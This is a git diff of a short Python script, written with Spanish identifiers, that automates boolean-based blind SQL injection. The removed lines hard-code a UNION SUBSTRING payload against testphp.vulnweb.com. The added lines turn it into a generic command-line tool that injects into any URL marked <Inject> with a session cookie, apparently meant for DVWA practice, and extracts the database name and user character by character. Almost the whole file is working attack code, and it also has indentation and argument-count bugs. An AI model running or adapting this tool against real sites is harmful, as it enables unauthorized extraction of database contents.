@@ -1,15 +1,17 @@
-# How to make http request
 import requests as req
 import string
-
-comprobador = "Si esite"
+import sys
 
 def requestador(letra,busqueda,numero):
-    urlCrafteado = "http://testphp.vulnweb.com/artists.php?artist=1 and 1=0 union select 1,IF(SUBSTRING(" + busqueda + ","+ str(numero) + ",1) = \"" + letra + "\", \"Si esite\", \"NO esite\"),3"
-    r = req.get(urlCrafteado)
-    # print(urlCrafteado)
-    return r.text
+    cookies = dict(PHPSESSID=coockieImput,security='low') # security low para DVWA unicamente
+   # print(url)
+    url2 = url[0:url.index("<Inject>")] + "1\' and SUBSTRING(" +busqueda+ ","+ str(numero) + ",1) = \"" + letra  + "\" -- -"
+    url3 = url[url.index("<Inject>") + 8: ]
+    urlCrafteado = url2 + url3
+    r = req.get(urlCrafteado, cookies=cookies)
 
+    #print(urlCrafteado)
+    return r.text
 
 
 def ysisi(webpage):
@@ -19,11 +21,6 @@ def ysisi(webpage):
     if res != -1:
         return True
     return False
-
-def main():
-    res = ysisi(requestador('b',"database()",1))
-    print(res)
-
 
 def takataka(seleccionador):
     dictionary = string.ascii_lowercase
@@ -36,18 +33,29 @@ def takataka(seleccionador):
         for item in dictionary:
             siono = ysisi(requestador(item, seleccionador, i))
             if siono:
-                print(str(i)+item + ' ' + str(siono))
                 result += item
                 i += 1
                 break
             if item == '0' and siono is False:
                 flag = True
                 break
+    return result
 
-    print(result)
+def banner():
+    print("usage: sqliblind.py <url> <succase_identifier> <coockie>")
+    print("Only works in boolena based char input blind SQLI")
+    print("parameters with value <Inject> will be injected")
+def main():
+    global url
+    global comprobador
+    global coockieImput
+    if(len(sys.argv) < 3):
+	banner()
+    else:
+	url = sys.argv[1]
+	comprobador = sys.argv[2]
+	coockieImput = sys.argv[3]
+        print("Database: "+ takataka("database()"))
+        print("Usuario: "+ takataka("user()"))
 
-
-takataka('database()')
-
-
-# main()
+main()
